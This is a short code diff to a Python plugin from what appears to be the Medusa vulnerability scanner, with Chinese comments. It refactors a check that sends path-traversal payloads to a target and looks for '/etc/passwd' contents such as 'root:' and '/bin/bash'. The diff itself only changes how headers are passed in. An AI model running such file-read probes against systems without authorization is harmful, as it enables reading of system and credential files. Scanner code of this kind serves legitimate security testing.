@@ -31,7 +31,7 @@ class UrlProcessing:  # URL处理函数
             res = urllib.parse.urlparse('http://%s' % url)
         return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies = Proxies().result(proxies)
     scheme, url, port ,path= UrlProcessing().result(Url)#这个系列的洞需要用到路径
     if port is None and scheme == 'https':
@@ -47,12 +47,8 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     for payload in [linux_payload,windows_payload]:
         try:
             payload_url = scheme + "://" + url + ":" + str(port) + path + payload
-            headers = {
-                'User-Agent': RandomAgent,
-                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-                "Accept-Encoding": "gzip, deflate",
-            }
-            resp=requests.get(payload_url,headers=headers, proxies=proxies,timeout=5, verify=False)
+
+            resp=requests.get(payload_url,headers=Headers, proxies=proxies,timeout=5, verify=False)
             code=resp.status_code
             con=resp.text
             if (code == 200 and con.find('root:')!=-1 and con.find('/bin/bash')!=-1 and con.find('bin:')!=-1) or DL.result():
